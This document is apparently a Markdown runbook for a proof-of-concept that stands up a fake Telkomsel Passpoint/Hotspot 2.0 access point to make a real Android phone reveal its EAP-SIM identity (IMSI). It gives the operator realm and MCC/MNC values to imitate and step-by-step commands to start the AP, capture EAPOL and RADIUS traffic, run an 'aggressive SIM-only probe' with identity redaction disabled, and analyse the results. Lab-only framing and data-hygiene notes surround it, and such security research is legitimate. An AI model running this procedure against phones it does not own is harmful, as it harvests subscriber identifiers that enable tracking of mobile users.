# Android Telkomsel Real-Phone Runbook

Use this when the victim/client is a real Android lab phone with a Telkomsel SIM.

## AP Advertisement Defaults

- SSID: `LAB-HS20`
- Operator friendly name: `Telkomsel Lab`
- MCC/MNC: `510/10`
- 3GPP realm: `wlan.mnc010.mcc510.3gppnetwork.org`
- EAP methods advertised: EAP-SIM, EAP-AKA, EAP-AKA'

These values help Android's carrier/Passpoint logic decide whether the AP is relevant. They do not authenticate the SIM by themselves.

## Start Lab AP

Run this on a Linux host/VM with the WiFi adapter passed through:

```bash
cd pocs/POC-WIFI-ENTERPRISE-UNIVERSAL
python3 poc.py --mode check --interface wlan1
python3 poc.py --mode start --interface wlan1 \
  --confirm-real-phone-lab \
  --confirm-rf-lab \
  --output evidence/telkomsel-start.json
```

Watch server-side logs:

```bash
docker compose logs -f radius ap
```

Capture EAPOL and RADIUS:

```bash
tcpdump -i wlan1 -vvv ether proto 0x888e
tcpdump -i any -vvv 'udp port 1812 or udp port 1813'
```

Or let the PoC runner capture WiFi-interface traffic, EAPOL, RADIUS, and AP/RADIUS logs:

```bash
python3 poc.py --mode capture --interface wlan1 --sudo --capture-seconds 120 \
  --output evidence/telkomsel-capture.json
```

Aggressive SIM-only probe:

```bash
python3 poc.py --mode sim-only-probe --hs20-profile telkomsel-optimized \
  --interface wlan1 --sudo --capture-seconds 180 \
  --confirm-real-phone-lab \
  --confirm-rf-lab \
  --no-redact-identities \
  --output evidence/telkomsel-sim-only-probe.json
```

This mode intentionally has no PEAP/TTLS fallback in FreeRADIUS. A non-matching phone should produce no identity, EAP-NAK, timeout, or Access-Reject.

Run a negative control after the positive trigger:

```bash
python3 poc.py --mode sim-only-probe --hs20-profile negative-control \
  --interface wlan1 --sudo --capture-seconds 120 \
  --confirm-real-phone-lab \
  --confirm-rf-lab \
  --no-redact-identities \
  --output evidence/negative-control-sim-only-probe.json
```

Expected: `telkomsel-optimized` may produce `permanent_eap_sim_identity`; `negative-control` should not.

Or run the full profile sweep:

```bash
python3 poc.py --mode sweep \
  --interface wlan1 --sudo --capture-seconds 90 \
  --confirm-real-phone-lab \
  --confirm-rf-lab \
  --no-redact-identities \
  --output evidence/sweep-result.json
```

The sweep recreates AP/RADIUS for each profile and writes `sweep_results[]`
with identity counts and EAP findings per profile. It writes
`evidence/sweep-summary.json` after each profile and keeps AP/RADIUS running
with `telkomsel-optimized` at the end unless `--stop-after-sweep` is set.

Analyze the captured evidence:

```bash
python3 poc.py --mode analyze-evidence \
  --input evidence/sweep-summary.json \
  --output evidence/analysis.json \
  --report evidence/analysis-report.md
```

The runner also stores AP/RADIUS logs and reports detected EAP-SIM identity
material in JSON:

- `permanent_eap_sim_identity`: the phone exposed `1 + IMSI`.
- `anonymous_identity`: the phone used an anonymous outer identity.
- `pseudonym_or_realm_identity`: the phone/carrier used a pseudonym or realm identity.

JSON output redacts identity values by default. Use `--no-redact-identities`
only for local lab evidence that will not be committed:

```bash
python3 poc.py --mode capture --interface wlan1 --sudo --capture-seconds 120 \
  --no-redact-identities \
  --output evidence/telkomsel-capture-full-identity.json
```

Stop the AP when done:

```bash
python3 poc.py --mode stop
```

## Phone Prep

1. Use only your lab phone and your own Telkomsel SIM.
2. Remove any saved network named `LAB-HS20`.
3. Enable WiFi and keep mobile service/SIM active.
4. Let Android scan naturally for a few cycles.
5. If the phone exposes Passpoint settings, ensure Passpoint/Hotspot 2.0 is enabled.

Consumer Android builds may not let you manually create an EAP-SIM Passpoint profile. For this PoC, avoid manual UI and root paths; use carrier-privileged, device-owner/MDM, or system-privileged provisioning.

For auto-install paths, see `profiles/android_passpoint_auto_install.md`.

Generate the lab Passpoint metadata:

```bash
python3 poc.py --mode provision-android \
  --output evidence/telkomsel-provisioning.json
```

## Optional Android Logs

If ADB is enabled on the lab phone:

```bash
adb logcat -b all | rg -i 'passpoint|hs20|anqp|carrier|eap|sim|aka|wificond|supplicant'
```

Useful signals:

- ANQP query/response for `LAB-HS20`.
- Carrier network matching for MCC/MNC `510/10`.
- EAP method selection `SIM`, `AKA`, or `AKA'`.
- Connection attempt to `LAB-HS20`.
- Failure reason before/after RADIUS exchange.

## Expected Result Without Operator AAA

With a commercial Telkomsel SIM and local FreeRADIUS only, expect one of these:

- The phone ignores the AP because no matching carrier/Passpoint profile is provisioned.
- The phone starts EAP-SIM/AKA and FreeRADIUS logs the identity exchange.
- Authentication fails with Access-Reject because the local backend has no valid Telkomsel authentication vectors.

Authentication success requires a legitimate AAA/operator path or a SIM/test-vector backend that you control.

## Data Hygiene

RADIUS, hostapd, tcpdump, and Android logs may expose IMSI, pseudonym identity, or carrier metadata. Store sanitized logs under `evidence/` and do not commit real subscriber identifiers.
